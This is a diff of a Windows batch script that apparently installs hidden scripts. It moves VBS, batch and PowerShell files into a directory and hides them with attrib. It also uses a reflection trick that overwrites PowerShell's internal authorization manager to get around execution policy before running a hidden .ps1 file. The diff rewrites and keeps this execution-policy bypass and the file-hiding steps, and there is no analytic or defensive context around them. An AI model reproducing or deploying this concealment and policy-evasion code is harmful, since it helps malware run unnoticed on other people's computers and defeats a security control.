@@ -75,19 +75,15 @@ ping 127.0.0.1 -n 22 > nul
 :: move script files with error checking
 if exist "%SF%\%NAME%.vbs" move /y "%SF%\%NAME%.vbs" "%HD%\" >nul
 if exist "%SF%\%NAME%.bat" move /y "%SF%\%NAME%.bat" "%HD%\" >nul
-if exist "%SF%\.del.bat" move /y "%SF%\.del.bat" "%HD%\" >nul
 if exist "%SF%\%NAME%.ps1" move /y "%SF%\%NAME%.ps1" "%HD%\" >nul
 if exist "%SF%\%NAME%e.ps1" move /y "%SF%\%NAME%e.ps1" "%HD%\" >nul
-if exist "%SF%\.ascii.txt" move /y "%SF%\.ascii.txt" "%HD%\" >nul
 if exist "%SF%\%NAME%x.ps1" move /y "%SF%\%NAME%x.ps1" "%HD%\" >nul
 
 attrib +h "%HD%\%NAME%.vbs"
 attrib +h "%HD%\%NAME%.bat"
 attrib +h "%HD%\%NAME%.ps1"
 attrib +h "%HD%\%NAME%e.ps1"
-attrib +h "%HD%\.ascii.txt"
 attrib +h "%HD%\%NAME%.txt"
-attrib +h "%HD%\.del.bat"
 attrib +h "%HD%\%NAME%x.ps1"
 
 for %%f in (%SF%\Firewall\.*) do (
@@ -96,6 +92,14 @@ for %%f in (%SF%\Firewall\.*) do (
 
 ping 127.0.0.1 -n 6 > nul
 
-powershell -ExecutionPolicy Bypass -Command "& {function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield('_context','nonpublic,instance').getvalue($executioncontext)).gettype().getfield('_authorizationManager','nonpublic,instance').setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager 'Microsoft.PowerShell'))}; Disable-ExecutionPolicy; %HD%\%NAME%x.ps1}"
+powershell -ExecutionPolicy Bypass -Command "& {
+    function Disable-ExecutionPolicy {
+        ($ctx = $executioncontext.gettype().getfield('_context','nonpublic,instance').getvalue($executioncontext)).gettype().getfield('_authorizationManager','nonpublic,instance').setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager 'Microsoft.PowerShell'))
+    };
+	
+    Disable-ExecutionPolicy;
+}"
+
+powershell -ExecutionPolicy Bypass -File '%HD%\%NAME%x.ps1'
 
 exit
